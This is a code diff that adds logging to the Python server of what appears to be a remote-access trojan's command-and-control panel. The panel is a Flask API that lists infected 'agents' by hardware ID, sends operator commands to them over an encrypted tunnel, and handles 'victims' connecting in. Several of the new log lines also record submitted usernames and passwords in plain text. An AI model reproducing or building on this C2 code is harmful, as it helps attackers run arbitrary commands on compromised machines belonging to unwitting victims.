@@ -14,12 +14,12 @@ import logging
 from flask import Flask, request, jsonify
 from dataclasses import dataclass
 
-from lib import api
+from lib import api, logger
 from lib.api import HTTP_SESSION
 from lib.crypto import EncryptedTunnel, get_hwid
 
 """
-TODO: create lib/logging.py & apply logging in main.py 
+TODO: apply logging in main.py  -> handle_victims
 """
 
 # ----> [ CLI parsing ] <----
@@ -75,11 +75,14 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
                 # Generate & add session
                 session = http_session.add_session(request.remote_addr)
                 
+                logger.info(f"{request.remote_addr} session generated & added")
                 return jsonify({"session": session[1]})
             else:
+                logger.info(f"{request.remote_addr} failed to authenticate ({USERNAME}:{PASSWORD})")
                 return jsonify({"error": "Username of password invalid"}), 401
     
         else:
+            logger.info(f"{request.remote_addr} failed to authenticate ({USERNAME}:{PASSWORD})")
             return jsonify({"error": "Username or password invalid"}), 401
 
      # >>> [GET_AGENTS] <<<
@@ -95,9 +98,11 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
                 FINGERPRINT = server_cfg.AGENTS[v][0].decode()
                 agents_fingerprint.append(FINGERPRINT)
 
+            logger.info(f"{request.remote_addr} fingerprint of the agents sent ({session})")
             return jsonify({"fingerprints": agents_fingerprint})
         
         else:
+            logger.info(f"{request.remote_addr} invalid session ({session})")
             return jsonify({"error": "Invalid session"})
 
     # >>> [ SEND_COMMAND ] <<<
@@ -113,16 +118,21 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         
         if not (key_agent is None):
             s: EncryptedTunnel = server_cfg.AGENTS[key_agent][2]
+            
             try:
+                logger.info(f"sending ({COMMAND}) command to {key_agent}")             
                 # TODO: do better  -> set recv dynamic bufsize
                 s.send(COMMAND)
-             
+
+                logger.info("command output sended")             
                 return jsonify({"output": await s.recv(server_cfg.BUFSIZE).decode()})
             
             except Exception as e:
+                logger.error(f"sending command failed: {key_agent}")
                 return jsonify({"error": str(e)}), 408
         
         else:
+            logger.info(f"failed finding agent ({request.remote_addr}): {AGENT_FINGERPRINT}")
             return jsonify({"error": "This agent don't exist"}), 403
             
     # --- [ Start HTTP(s) server ] ---
@@ -179,6 +189,7 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
 
 async def main():
     args = parser.parse_args()
+    logger.debug(f"arguments: {args}")
 
     # Disable Flask printing
     logging.getLogger("werkzeug").disabled = True
@@ -188,6 +199,8 @@ async def main():
     
     if args.ssl:
         https_files = (CURRENT_DIR + "/config/website.crt", CURRENT_DIR + "/config/private.key")
+        logger.debug(f"SSL: {https_files}")
+    
     else:
         https_files = ()
 
